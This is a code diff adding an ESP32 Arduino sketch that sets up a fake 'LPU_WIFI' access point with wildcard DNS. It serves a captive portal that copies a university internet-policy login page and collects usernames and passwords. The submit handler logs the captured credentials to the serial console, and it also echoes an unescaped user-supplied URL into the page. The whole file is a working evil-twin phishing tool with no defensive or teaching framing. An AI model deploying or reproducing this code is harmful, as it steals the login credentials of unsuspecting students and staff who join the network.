@@ -1,0 +1,177 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+
+const char* ssid = "LPU_WIFI";
+const char* password = "12345678";
+
+WebServer server(80);
+DNSServer dnsServer;
+const byte DNS_PORT = 53;
+
+String customURL = "portal.local";
+
+/* -------- LOGIN PAGE -------- */
+void handleLoginPage() {
+
+String page = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:linear-gradient(90deg,#f7a1a1,#9bb5d6);
+}
+.wrapper{
+  width:90%;
+  max-width:1000px;
+  margin:40px auto;
+  display:flex;
+  background:rgba(255,255,255,0.85);
+  border-radius:20px;
+  overflow:hidden;
+}
+.left{
+  flex:2;
+  padding:30px;
+}
+.right{
+  flex:1;
+  background:#c8b3d6;
+  padding:30px;
+}
+h2{
+  margin-top:0;
+}
+input[type=text],input[type=password]{
+  width:100%;
+  padding:8px;
+  margin:8px 0;
+  border-radius:6px;
+  border:1px solid #aaa;
+}
+button{
+  background:#2f6fe4;
+  color:white;
+  padding:10px;
+  border:none;
+  border-radius:6px;
+  width:100%;
+  margin-top:10px;
+}
+.small{
+  font-size:12px;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+
+<div class="left">
+<h2>University Internet Policy</h2>
+<p class="small">
+I understand and agree that this internet access is provided only for academic use.
+Any misuse or unauthorized access is not permitted and may lead to disciplinary action.
+</p>
+<label>
+<input type="checkbox" name="agree"> 
+I Agree with Terms and Conditions
+</label>
+</div>
+
+<div class="right">
+<h2>Client Login</h2>
+<form action="/login" method="POST">
+<label>User Name</label>
+<input name="user" type="text">
+
+<label>Password</label>
+<input name="pass" type="password">
+
+<label>Portal URL</label>
+<input name="url" maxlength="32" placeholder="portal.local">
+
+<label>
+<input type="checkbox" name="save"> Save Password
+</label>
+
+<button type="submit">Login</button>
+</form>
+</div>
+
+</div>
+</body>
+</html>
+)rawliteral";
+
+  server.send(200, "text/html", page);
+}
+
+/* -------- AFTER LOGIN PAGE -------- */
+void handleLoginSubmit() {
+
+  String user = server.arg("user");
+  String pass = server.arg("pass");
+
+  if (server.hasArg("url")) {
+    customURL = server.arg("url");
+  }
+
+  // Print credentials to Serial Monitor
+  Serial.println("---- Login Attempt ----");
+  Serial.print("User: ");
+  Serial.println(user);
+  Serial.print("Pass: ");
+  Serial.println(pass);
+  Serial.print("URL: ");
+  Serial.println(customURL);
+  Serial.println("-----------------------");
+
+String page = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
+page += "<style>body{margin:0;font-family:Arial;background:linear-gradient(90deg,#f7a1a1,#9bb5d6);} ";
+page += ".box{width:90%;max-width:500px;margin:60px auto;padding:30px;";
+page += "background:rgba(255,255,255,0.85);border-radius:30px;text-align:center;} ";
+page += "button{background:#2f6fe4;color:white;padding:10px 20px;border:none;border-radius:6px;}</style>";
+page += "</head><body>";
+
+page += "<div class='box'>";
+page += "<h2>Connected Successfully</h2>";
+page += "<p>Portal URL:</p>";
+page += "<b>" + customURL + "</b><br><br>";
+page += "<button>Logout</button>";
+page += "<p style='font-size:12px;margin-top:20px;'>You may now open a new browser window.</p>";
+page += "</div>";
+
+page += "</body></html>";
+
+  server.send(200, "text/html", page);
+}
+
+/* -------- SETUP -------- */
+void setup() {
+  Serial.begin(115200);
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(ssid, password);
+
+  Serial.print("AP IP address: ");
+  Serial.println(WiFi.softAPIP());
+
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+
+  server.on("/", handleLoginPage);
+  server.on("/login", HTTP_POST, handleLoginSubmit);
+  server.onNotFound(handleLoginPage);
+
+  server.begin();
+}
+
+/* -------- LOOP -------- */
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
